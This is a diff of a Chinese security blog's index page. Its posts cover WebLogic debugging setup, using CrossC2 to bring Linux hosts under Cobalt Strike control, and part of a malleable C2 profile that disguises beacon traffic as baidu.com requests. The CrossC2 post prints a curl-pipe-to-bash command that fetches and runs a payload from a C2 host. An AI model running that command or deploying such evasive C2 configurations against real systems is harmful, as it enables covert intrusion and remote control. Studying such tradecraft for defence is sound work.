@@ -152,6 +152,280 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
+    <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8B%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="藏青">
+      <meta itemprop="description" content="知行合一">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="藏青's BLOG">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8B%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" class="post-title-link" itemprop="url">weblogic漏洞分析系列之调试环境搭建</a>
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2020-10-30 20:32:17 / Modified: 23:13:37" itemprop="dateCreated datePublished" datetime="2020-10-30T20:32:17+08:00">2020-10-30</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" itemprop="url" rel="index">
+                    <span itemprop="name">漏洞分析</span>
+                  </a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" itemprop="url" rel="index">
+                    <span itemprop="name">代码审计</span>
+                  </a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>​        最近一直在做一些项目，因为对一些原理性的知识不懂感觉渗透很难再继续往上走，因此接下来打算将精力放在漏洞的理解和分析，工具的编写和优化上面，而不再执着于更多的技巧。</p>
+<p>​        weblogic是一款比较经常使用的java容器，当然它爆出的漏洞也是层出不穷，为了能让自己更加了解weblogic漏洞的形成原因，我决定和大家一起调试weblogic各个版本的一些漏洞，并最终编写一个简单的weblogic漏洞检测工具，在这片文章中，我们首先一起来学习一下如何搭建weblogic的调试环境。</p>
+<h2 id="调试环境搭建"><a href="#调试环境搭建" class="headerlink" title="调试环境搭建"></a>调试环境搭建</h2><p>​        首先，在官网下载weblogic的安装包，双击进行安装</p>
+<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8B%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20201030210608351.png" alt="image-20201030210608351"></p>
+<p>​        安装好以后，创建weblogic域</p>
+<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8B%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20201030210658376.png" alt="image-20201030210658376"></p>
+<p>​        安装成功后，在domains下的bin目录下有个startWebLogic.cmd文件</p>
+<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8B%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20201030210904700.png" alt="image-20201030210904700"></p>
+<p>​        编辑startWebLogic.cmd文件，在文件的开头加上如下内容</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set JAVA_OPTIONS&#x3D;-Xdebug -Xnoagent -Djava.compiler&#x3D;NONE -Xrunjdwp:transport&#x3D;dt_socket,address&#x3D;9999,server&#x3D;y,suspend&#x3D;n</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8B%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20201030204516719.png" alt="image-20201030204516719"></p>
+<p>​        双击startWebLogic.cmd启动weblogic,可以看到已经开启了9999端口的监听</p>
+<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8B%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20201030210943558.png" alt="image-20201030210943558"></p>
+<p>​        同时使用netstat查看，也可以看到9999端口的监听</p>
+<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8B%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20201030211009015.png" alt="image-20201030211009015"></p>
+<p>​        打开idea,import wlserver_10.3这个目录</p>
+<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8B%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20201030211258783.png" alt="image-20201030211258783"></p>
+<p>​        在server/lib目录上选择add as library</p>
+<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8B%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20201030211344142.png" alt="image-20201030211344142"></p>
+<p>​        选择调试配置</p>
+<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8B%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20201030211447373.png" alt="image-20201030211447373"></p>
+<p>​        添加一个remote的配置</p>
+<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8B%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20201030230633634.png" alt="image-20201030230633634"></p>
+<p>端口选择9999端口</p>
+<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8B%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20201030230709499.png" alt="image-20201030230709499"></p>
+<p>​        我们再点击debug，如果成功则会出现Connected to the target VM, address: ‘127.0.0.1:9999’, transport: ‘socket’，没成功的话可以重新运行startWebLogic.cmd文件再去debug。</p>
+<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8B%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20201030230745586.png" alt="image-20201030230745586"></p>
+<p>​        为了测试能否下断点，我们首先测试一下CVE-2017-10271这个漏洞，再漏洞的返回包中查看调用链，这里可以看到调用了weblogic.wsee.workarea.WorkContextXmlInputAdapter类的readUTF方法</p>
+<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8B%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20201030230958127.png" alt="image-20201030230958127"></p>
+<p>​        我们找到readUTF方法并下断点，查看能否断住，我这里可以成功下到断点，至此，weblogic的调试环境搭建成功。</p>
+<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8B%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20201030231147688.png" alt="image-20201030231147688"></p>
+<p><strong>参考文章</strong></p>
+<p><a href="https://badcode.cc/2018/05/20/WebLogic-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" target="_blank" rel="noopener">WebLogic-动态调试环境搭建</a></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+        
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
+    <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2020/10/04/CrossC2%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%AE%B0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="藏青">
+      <meta itemprop="description" content="知行合一">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="藏青's BLOG">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/10/04/CrossC2%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%AE%B0/" class="post-title-link" itemprop="url">CrossC2使用小记</a>
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2020-10-04 14:25:37" itemprop="dateCreated datePublished" datetime="2020-10-04T14:25:37+08:00">2020-10-04</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2020-10-09 15:24:04" itemprop="dateModified" datetime="2020-10-09T15:24:04+08:00">2020-10-09</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/cobaltstrike/" itemprop="url" rel="index">
+                    <span itemprop="name">cobaltstrike</span>
+                  </a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>​        通常我们使用cobaltstrike来上线windows主机，但是如果我们要控的主机是个linux主机，则cobaltstrike则无能为力，今天我们一起来学习一款插件使用cobaltstrike来上线linux主机，即CrossC2 framework。</p>
+<h3 id="下载和安装"><a href="#下载和安装" class="headerlink" title="下载和安装"></a>下载和安装</h3><p>​        我们可以在<a href="https://github.com/Mr-xn/CrossC2" target="_blank" rel="noopener">地址</a>来下载CrossC2 framework的2.0版本，下载好以后，目录结构如下：</p>
+<p><img src="/2020/10/04/CrossC2%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%AE%B0/image-20201004143509004.png" alt="image-20201004143509004"></p>
+<p>​        使用Cobaltstrike来加载src/CrossC2.cna脚本</p>
+<p><img src="/2020/10/04/CrossC2%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%AE%B0/image-20201004144141249.png" alt="image-20201004144141249"></p>
+<p>​        修改CrossC2.cna文件中的$CC2_PATH为脚本所在目录的绝对路径。</p>
+<p><img src="/2020/10/04/CrossC2%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%AE%B0/image-20201009152359933.png" alt="image-20201009152359933"></p>
+<h3 id="使用CrossC2上线Linux"><a href="#使用CrossC2上线Linux" class="headerlink" title="使用CrossC2上线Linux"></a>使用CrossC2上线Linux</h3><p>创建一个https Listener</p>
+<p><img src="/2020/10/04/CrossC2%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%AE%B0/image-20201004145627127.png" alt="image-20201004145627127"></p>
+<p>​        登录到Cobaltstrike服务器端，在Cobaltstrike的根目录下找到.cobaltstrike.beacon_keys文件，下载到本地的CrossC2-master\src\目录下。</p>
+<p><img src="/2020/10/04/CrossC2%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%AE%B0/image-20201004145956792.png" alt="image-20201004145956792"></p>
+<p>​        选择生成CrossC2</p>
+<p><img src="/2020/10/04/CrossC2%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%AE%B0/image-20201007213619681.png" alt="image-20201007213619681"></p>
+<p>​        在弹出的地址中进行设置，需要设置的点有三处，第一处是choose beacon_keys，第二处是监听的Listener,这里的listener需要创建https类型的，payload_type选择不分阶段的payload.</p>
+<p><img src="/2020/10/04/CrossC2%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%AE%B0/image-20201007213719177.png" alt="image-20201007213719177"></p>
+<p>​        生成成功会生成一个命令，通过执行这个命令可以使linux主机上线。</p>
+<p><img src="/2020/10/04/CrossC2%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%AE%B0/image-20201007214059062.png" alt="image-20201007214059062"></p>
+<p>​        命令如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -A o -o- -L http:&#x2F;&#x2F;xxxx:xxxx&#x2F;a | bash -s</span><br></pre></td></tr></table></figure>
+
+<p>​        在目标主机执行后会远程下载文件并执行</p>
+<p><img src="/2020/10/04/CrossC2%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%AE%B0/image-20201007214343816.png" alt="image-20201007214343816"></p>
+<p>​        这里我遇到了一个小问题，就是执行成功以后并没有上线，为了分析是什么问题导致的，我手动执行进行测试，过程如下：</p>
+<p>​        首先我手工访问生成的url，内容如下：</p>
+<p><img src="/2020/10/04/CrossC2%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%AE%B0/image-20201007220335987.png" alt="image-20201007220335987"></p>
+<p>​        我将上面请求的地址手动下载下来在我的linux主机上执行，发现是可以正常上线的。</p>
+<p><img src="/2020/10/04/CrossC2%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%AE%B0/image-20201007220531557.png" alt="image-20201007220531557"></p>
+<p>​        那为什么我curl执行的时候无法上线，我们注意看一下这个代码</p>
+<p><img src="/2020/10/04/CrossC2%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%AE%B0/image-20201007220628199.png" alt="image-20201007220628199"></p>
+<p>​        这里延迟7秒无论执行是否成功都会删除上传的payload,那如果在7秒中没有执行结束，也会删除，因此无法正常上线，这个代码在CrossC2.cna脚本中，我们稍微修改一下，修改为sleep 30s再进行上线测试，即可上线成功。</p>
+<p><img src="/2020/10/04/CrossC2%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%AE%B0/image-20201007220814164.png" alt="image-20201007220814164"></p>
+<p>​        但是上线后执行命令后获取不到执行后的返回结果，通过查看CrossC2的参考文档，发现CrossC2仅仅支持到3.14以前，因为我使用的是Cobaltstrike 4.0，因此推测可能是因为使用的Cobaltstrike版本太高而导致的，因此使用Cobaltstrike 3.14来进行测试，仍然无法获取返回的结果。</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+        
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
+    <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2020/09/09/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E7%89%B9%E5%BE%81%E5%88%86%E6%9E%90/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="藏青">
+      <meta itemprop="description" content="知行合一">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="藏青's BLOG">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/09/09/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E7%89%B9%E5%BE%81%E5%88%86%E6%9E%90/" class="post-title-link" itemprop="url">关于内网横向渗透的特征分析</a>
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2020-09-09 11:48:20 / Modified: 11:48:34" itemprop="dateCreated datePublished" datetime="2020-09-09T11:48:20+08:00">2020-09-09</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+        
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
     <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -175,10 +449,16 @@
                 <i class="fa fa-calendar-o"></i>
               </span>
               <span class="post-meta-item-text">Posted on</span>
-              
 
-              <time title="Created: 2020-09-08 11:11:22 / Modified: 19:57:03" itemprop="dateCreated datePublished" datetime="2020-09-08T11:11:22+08:00">2020-09-08</time>
+              <time title="Created: 2020-09-08 11:11:22" itemprop="dateCreated datePublished" datetime="2020-09-08T11:11:22+08:00">2020-09-08</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2020-10-12 10:59:14" itemprop="dateModified" datetime="2020-10-12T10:59:14+08:00">2020-10-12</time>
+              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="fa fa-folder-o"></i>
@@ -280,7 +560,7 @@
 <p>​        获取回显的数据包如下</p>
 <p><img src="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/image-20200908163806457.png" alt="image-20200908163806457"></p>
 <p>​        好了，配置mallable C2 profile到此为止了，附上最终的profile文件</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br></pre></td><td class="code"><pre><span class="line">###Global Options###</span><br><span class="line">set sample_name &quot;baidu.profile&quot;;</span><br><span class="line"></span><br><span class="line">set sleeptime &quot;5000&quot;;  </span><br><span class="line">set jitter    &quot;30&quot;;   </span><br><span class="line">set useragent &quot;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;85.0.4183.83 Safari&#x2F;537.36&quot;; </span><br><span class="line"></span><br><span class="line">###SMB options###    </span><br><span class="line">set pipename &quot;ntsvcs&quot;;</span><br><span class="line">set pipename_stager &quot;nbtsvcs&quot;;</span><br><span class="line"></span><br><span class="line">http-get &#123;</span><br><span class="line"></span><br><span class="line">    set uri &quot;&#x2F;cache&#x2F;global&#x2F;img&#x2F;aladdinIcon-1.0.gif&quot;;</span><br><span class="line">	client &#123;</span><br><span class="line">        header &quot;Host&quot; &quot;www.baidu.com&quot;;</span><br><span class="line">        header &quot;Sec-Fetch-Site&quot; &quot;same-origin&quot;;</span><br><span class="line">        header &quot;Sec-Fetch-Mode&quot; &quot;no-cors&quot;;</span><br><span class="line">        header &quot;Sec-Fetch-Dest&quot; &quot;image&quot;;</span><br><span class="line">        header &quot;Referer&quot; &quot;https:&#x2F;&#x2F;www.baidu.com&#x2F;&quot;;</span><br><span class="line">        header &quot;Connection&quot; &quot;Keep-Alive&quot;;</span><br><span class="line">	</span><br><span class="line">        metadata &#123;</span><br><span class="line">            netbios;</span><br><span class="line">	    parameter &quot;sid&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    server &#123;</span><br><span class="line">		header &quot;Accept-Ranges&quot; &quot;bytes&quot;;</span><br><span class="line">		header &quot;Cache-Control&quot; &quot;max-age&#x3D;315360000&quot;;	</span><br><span class="line">		header &quot;Content-Type&quot; &quot;image&#x2F;gif&quot;;</span><br><span class="line">		header &quot;Date&quot; &quot;Tue, 08 Sep 2020 06:29:52 GMT&quot;;</span><br><span class="line">		header &quot;Etag&quot; &quot;216-4c1c6ca3503c0&quot;;</span><br><span class="line">		header &quot;Expires&quot; &quot;216-4c1c6ca3503c0&quot;;</span><br><span class="line">		header &quot;Last-Modified&quot; &quot;Wed, 06 Jun 2012 05:10:47 GMT&quot;;</span><br><span class="line">		header &quot;Server&quot; &quot;Apache&quot;;</span><br><span class="line">		header &quot;Connection&quot; &quot;close&quot;;</span><br><span class="line">        output &#123;</span><br><span class="line">        	netbios;</span><br><span class="line">        	prepend &quot;                 &quot;;</span><br><span class="line">	   		prepend &quot;GIF89a&quot;;</span><br><span class="line">	    	append &quot;;&quot;;</span><br><span class="line">        	print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">http-post &#123;</span><br><span class="line">    set uri &quot;&#x2F;link&quot;;</span><br><span class="line">    set verb &quot;GET&quot;;</span><br><span class="line">    client &#123;</span><br><span class="line">	header &quot;Host&quot; &quot;www.baidu.com&quot;;</span><br><span class="line">        header &quot;Sec-Fetch-Site&quot; &quot;same-origin&quot;;</span><br><span class="line">        header &quot;Sec-Fetch-Mode&quot; &quot;navigate&quot;;</span><br><span class="line">        header &quot;Sec-Fetch-Dest&quot; &quot;document&quot;;</span><br><span class="line">        header &quot;Referer&quot; &quot;https:&#x2F;&#x2F;www.baidu.com&#x2F;&quot;;</span><br><span class="line">        header &quot;Connection&quot; &quot;close&quot;;</span><br><span class="line">        output &#123;</span><br><span class="line">            base64url;</span><br><span class="line">	    	parameter &quot;url&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        id &#123;</span><br><span class="line">            base64url;</span><br><span class="line">            parameter &quot;eqid&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">		parameter &quot;wd&quot; &quot;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line">	header &quot;Bdpagetype&quot; &quot;3&quot;;</span><br><span class="line">	header &quot;Content-Type&quot; &quot;text&#x2F;html&quot;;	</span><br><span class="line">	header &quot;Server&quot; &quot;BWS&#x2F;1.1&quot;;</span><br><span class="line">	header &quot;Set-Cookie&quot; &quot;BDSVRTM&#x3D;0; path&#x3D;&#x2F;&quot;;</span><br><span class="line">	header &quot;Vary&quot; &quot;Accept-Encoding&quot;;</span><br><span class="line">    header &quot;X-Ua-Compatible&quot; &quot;IE&#x3D;Edge,chrome&#x3D;1&quot;;    </span><br><span class="line">	header &quot;Connection&quot; &quot;close&quot;;</span><br><span class="line">        output &#123;</span><br><span class="line">            netbios;</span><br><span class="line">            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">http-stager &#123;</span><br><span class="line"></span><br><span class="line">	set uri_x86 &quot;&#x2F;favicon.ico&quot;;</span><br><span class="line">	set uri_x64 &quot;&#x2F;Favicon.ico&quot;;</span><br><span class="line"></span><br><span class="line">    client &#123;</span><br><span class="line">	header &quot;Host&quot; &quot;www.baidu.com&quot;;</span><br><span class="line">        header &quot;Sec-Fetch-Site&quot; &quot;same-origin&quot;;</span><br><span class="line">        header &quot;Sec-Fetch-Mode&quot; &quot;navigate&quot;;</span><br><span class="line">        header &quot;Sec-Fetch-Dest&quot; &quot;document&quot;;</span><br><span class="line">        header &quot;Referer&quot; &quot;https:&#x2F;&#x2F;www.baidu.com&#x2F;img&#x2F;bd_logo1.png&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">	server &#123;</span><br><span class="line">	header &quot;Accept-Ranges&quot; &quot;bytes&quot;;</span><br><span class="line">	header &quot;Content-Type&quot; &quot;image&#x2F;x-icon&quot;;	</span><br><span class="line">	header &quot;Etag&quot; &quot;423e-55c8139094a40&quot;;</span><br><span class="line">	header &quot;Last-Modified:&quot; &quot;Fri, 27 Oct 2017 06:16:01 GMT&quot;;</span><br><span class="line">    	header &quot;Server&quot; &quot;Apache&quot;;</span><br><span class="line">    	header &quot;Vary&quot; 